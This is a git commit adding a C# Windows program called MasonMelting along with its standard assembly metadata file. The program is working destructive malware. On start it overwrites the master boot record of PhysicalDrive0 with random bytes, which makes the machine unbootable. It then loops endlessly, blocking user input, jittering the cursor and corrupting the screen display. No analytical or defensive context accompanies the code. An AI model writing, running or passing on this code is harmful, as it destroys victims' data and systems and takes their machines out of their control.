9630702cfa20b70c53b77e257212225c3d62b38f
Freemasonry <95870255+MasonGroup@users.noreply.github.com>
2024-09-29 05:25:31 +0300

    Add files via upload

---
+++ MasonMelting/Program.cs
@@ -0,0 +1,81 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+class lhwbe
+{
+    [DllImport("user32.dll")]
+    private static extern bool GetCursorPos(out POINT lpPoint);
+
+    [DllImport("user32.dll")]
+    private static extern bool SetCursorPos(int X, int Y);
+
+    [DllImport("user32.dll")]
+    private static extern bool BlockInput(bool blockIt);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetDC(IntPtr hWnd);
+
+    [DllImport("user32.dll")]
+    private static extern void ReleaseDC(IntPtr hWnd, IntPtr hdc);
+
+    [DllImport("user32.dll")]
+    private static extern int GetSystemMetrics(int nIndex);
+
+    [DllImport("gdi32.dll")]
+    private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
+                                       IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
+
+    private const int SM_CXSCREEN = 0;
+    private const int SM_CYSCREEN = 1;
+    private const uint SRCCOPY = 0x00CC0020;
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct POINT
+    {
+        public int X;
+        public int Y;
+    }
+
+    static void Main()
+    {
+        Random rand = new Random();
+        POINT cursor;
+
+        OverwriteMBR();
+
+        while (true)
+        {
+            GetCursorPos(out cursor);
+            int X = cursor.X + rand.Next(-1, 2);
+            int Y = cursor.Y + rand.Next(-1, 2);
+
+            BlockInput(true);
+            SetCursorPos(X, Y);
+
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            int w = GetSystemMetrics(SM_CXSCREEN);
+            int h = GetSystemMetrics(SM_CYSCREEN);
+            int rx = rand.Next(w);
+
+            BitBlt(hdc, rx, 20, 200, h, hdc, rx, -3, SRCCOPY);
+
+            ReleaseDC(IntPtr.Zero, hdc);
+
+            Thread.Sleep(5);
+            BlockInput(false);
+        }
+    }
+
+    static void OverwriteMBR()
+    {
+        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
+        {
+            byte[] mbrData = new byte[512];
+            Random rand = new Random();
+            rand.NextBytes(mbrData);
+            fs.Write(mbrData, 0, mbrData.Length);
+        }
+    }
+}
---
+++ MasonMelting/Properties/AssemblyInfo.cs
@@ -0,0 +1,33 @@
+﻿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// General Information about an assembly is controlled through the following
+// set of attributes. Change these attribute values to modify the information
+// associated with an assembly.
+[assembly: AssemblyTitle("MasonMelting")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("MasonMelting")]
+[assembly: AssemblyCopyright("Copyright ©  2024")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Setting ComVisible to false makes the types in this assembly not visible
+// to COM components.  If you need to access a type in this assembly from
+// COM, set the ComVisible attribute to true on that type.
+[assembly: ComVisible(false)]
+
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+[assembly: Guid("93afcc4c-9855-4c43-8d63-d3d07887b207")]
+
+// Version information for an assembly consists of the following four values:
+//
+//      Major Version
+//      Minor Version
+//      Build Number
+//      Revision
+//
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
